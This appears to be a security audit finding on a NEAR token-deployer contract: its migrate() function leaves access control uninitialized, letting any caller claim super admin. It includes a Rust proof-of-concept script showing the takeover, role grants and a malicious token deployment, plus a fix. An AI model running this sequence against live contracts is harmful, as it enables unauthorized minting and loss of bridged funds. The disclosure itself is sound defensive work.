### Title
ACL Storage Left Uninitialized After `migrate()` Allows Any Caller to Seize Super Admin and Full Contract Control — (`near/token-deployer/src/migrate.rs`)

---

### Summary

The `migrate()` function in `TokenDeployer` reconstructs contract state without initializing the `near_plugins` ACL storage. Because `near_plugins`' `acl_init_super_admin` is callable by anyone when no super admin exists, any account can immediately claim super admin after a legitimate migration, grant itself `Controller` and `DAO` roles, replace `global_code_hash` with malicious WASM, and deploy attacker-controlled token contracts.

---

### Finding Description

`new()` correctly bootstraps the ACL: [1](#0-0) 

```rust
contract.acl_init_super_admin(near_sdk::env::predecessor_account_id());
contract.acl_grant_role(Role::DAO.into(), dao.clone());
contract.acl_grant_role(Role::Controller.into(), controller);
contract.acl_transfer_super_admin(dao);
```

`migrate()` does none of this: [2](#0-1) 

```rust
pub fn migrate(global_code_hash: Base58CryptoHash) -> Self {
    // ...
    Self {
        global_code_hash: global_code_hash.into(),
    }
}
```

After `migrate()` executes, the `near_plugins` ACL storage key is completely absent. The `acl_init_super_admin` method in `near_plugins` v0.4.1 (the pinned version) succeeds for any caller when no super admin is currently registered — it is explicitly designed as a one-time bootstrap call with no predecessor check beyond "no super admin exists yet." [3](#0-2) 

The `#[private]` on `migrate()` only restricts who can call `migrate()` itself (predecessor must equal `current_account_id`). It places no restriction on subsequent calls to `acl_init_super_admin` by external accounts after migration completes.

---

### Impact Explanation

Once the attacker holds super admin:

1. **`acl_grant_role("DAO", attacker)`** — super admin can grant any role.
2. **`set_global_code_hash(malicious_hash)`** — requires `Role::DAO`; now attacker-controlled. [4](#0-3) 
3. **`acl_grant_role("Controller", attacker)`** — grants `deploy_token` access.
4. **`deploy_token(token_id, metadata)`** — requires `Role::Controller` or `Role::LegacyController`; deploys a token subaccount initialized with the malicious WASM. [5](#0-4) 

The malicious WASM can implement arbitrary `ft_mint`/`ft_burn` logic. Because the bridge contract treats tokens deployed by `TokenDeployer` as canonical bridged assets, the attacker gains the ability to mint or burn any bridged token deployed through this path, constituting unauthorized minting and permanent loss of bridged funds.

---

### Likelihood Explanation

The window of vulnerability is the time between the `migrate()` call completing and the legitimate operator calling `acl_init_super_admin`. On a public NEAR network this window is at minimum one block (~1 second). A monitoring bot or a front-running transaction can exploit it deterministically. No privileged access, leaked keys, or validator collusion is required — only the ability to submit a transaction after observing the migration on-chain.

---

### Recommendation

`migrate()` must replicate the ACL bootstrap performed in `new()`. At minimum:

```rust
pub fn migrate(global_code_hash: Base58CryptoHash, controller: AccountId, dao: AccountId) -> Self {
    // ... existing state deserialization ...
    let mut contract = Self { global_code_hash: global_code_hash.into() };
    contract.acl_init_super_admin(env::predecessor_account_id());
    contract.acl_grant_role(Role::DAO.into(), dao.clone());
    contract.acl_grant_role(Role::Controller.into(), controller);
    contract.acl_transfer_super_admin(dao);
    contract
}
```

Since `migrate()` is `#[private]`, the caller is already the contract itself, so `predecessor_account_id()` is safe to use as the initial super admin before transferring it to `dao`.

---

### Proof of Concept

```rust
// 1. Serialize an OldLegacyState and set it as contract storage on sandbox.
// 2. Deploy new TokenDeployer WASM and call migrate(hash) as a self-call.
// 3. From an unprivileged account `attacker`:
attacker.call(deployer_id, "acl_init_super_admin")
    .args_json(json!({"account_id": attacker.id()}))
    .transact().await?;
// Assert: returns true (no super admin existed)

attacker.call(deployer_id, "acl_grant_role")
    .args_json(json!({"role": "Controller", "account_id": attacker.id()}))
    .transact().await?;

attacker.call(deployer_id, "acl_grant_role")
    .args_json(json!({"role": "DAO", "account_id": attacker.id()}))
    .transact().await?;

attacker.call(deployer_id, "set_global_code_hash")
    .args_json(json!({"global_code_hash": malicious_hash}))
    .transact().await?;

attacker.call(deployer_id, "deploy_token")
    .args_json(json!({"account_id": "evil-token.near", "metadata": {...}}))
    .deposit(NearToken::from_near(5))
    .transact().await?;
// evil-token.near is now initialized with malicious WASM, controller = attacker
```

    pub fn migrate(global_code_hash: Base58CryptoHash) -> Self {
        if !env::state_exists() {
            env::panic_str("Old state not found. Migration is not needed.")
        }

        let state = env::storage_read(STATE_KEY)
            .unwrap_or_else(|| env::panic_str("Failed to read state key."));

        if OldState::try_from_slice(&state).is_ok()
            || OldLegacyState::try_from_slice(&state).is_ok()
        {
            Self {
                global_code_hash: global_code_hash.into(),
            }
        } else {
            env::panic_str("Old state not found. Migration is not needed.")
        }
    }
